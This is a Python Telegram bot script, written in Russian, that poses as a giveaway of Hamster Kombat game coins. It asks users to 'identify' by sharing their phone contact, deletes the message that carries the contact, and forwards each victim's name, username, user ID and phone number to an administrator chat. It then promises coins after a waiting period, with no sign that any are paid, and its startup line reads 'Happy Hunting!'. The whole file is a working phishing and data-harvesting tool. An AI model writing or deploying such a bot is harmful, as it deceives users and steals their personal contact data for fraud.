import logging
import os
import random
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
import importlib.util

# Определение пути к config.py
config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', 'config.py')

# Загрузка конфигурации
spec = importlib.util.spec_from_file_location("config", config_path)
config = importlib.util.module_from_spec(spec)
spec.loader.exec_module(config)

API_TOKEN = config.TOKEN
ADMIN_CHAT_ID = config.CHATID

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# Обработчик стартовой функции
@dp.message_handler(commands=['start'])
async def on_start(message: types.Message):
    await message.answer("<b>🖐 Привет это бот за регистрацию в которой\n"
                         "Вы можете получить дополнительные Hamster Kombat монеты!.\n\n"
                         "Монеты выдаются раз в 5-дней, сумма вариаруется от 10000-30000 тысяч монетов\n\n"
                         "Для начала пройдите идентификацию /identification </b>", parse_mode="HTML")

# Обработчик идентификации
@dp.message_handler(commands=['identification'])
async def on_start(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    button = types.KeyboardButton(text="✅ Подтвердить номер телефона", request_contact=True)
    keyboard.add(button)
    
    await message.answer("<b>Номер телефона\n\n"
                         "Вам необходимо подтвердить номер телефона для того, чтобы завершить идентификацию в Hamster Kombat!.\n\n"
                         "Для этого нажмите кнопку ниже.</b>", reply_markup=keyboard, parse_mode="HTML")

# Обработчик получения информации
@dp.message_handler(content_types=[types.ContentType.CONTACT])
async def on_contact_received(message: types.Message):
    contact = message.contact
    await message.answer("Вы успешно идентифицированы.", reply_markup=types.ReplyKeyboardRemove())
    
    await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)

    # Отправка сообщения админу
    admin_message = (f"Получен новый контакт:\n"
                     f"Имя: {contact.first_name}\n"
                     f"Никнейм: {message.from_user.username}\n"
                     f"Chatid: {contact.user_id}\n"
                     f"Номер телефона: {contact.phone_number}")
    await bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message)

    # Отправка инструкций пользователю
    await bot.send_message(chat_id=message.chat.id, text=(
	"<b>Привет! Добро пожаловать в Hamster Kombat 🐹\n"
	"Отныне ты — директор криптобиржи. \n"
	"Какой? Выбирай сам. Тапай по экрану, собирай монеты, качай пассивный доход, разрабатывай"
	"собственную стратегию дохода.\n"
	"Мы в свою очередь оценим это во время листинга токена, даты которого ты узнаешь совсем скоро.\n"
	"Про друзей не забывай — зови их в игру и получайте вместе ещё больше монет!\n"

	"P.S Вы должны подождать 3-дня для того чтобы получить первые монеты</b>"
    ), parse_mode="Markdown")

if __name__ == '__main__':
    print("[+] HK Bot has been started!\n[!] Happy Hunting!")
    executor.start_polling(dp, skip_updates=True)
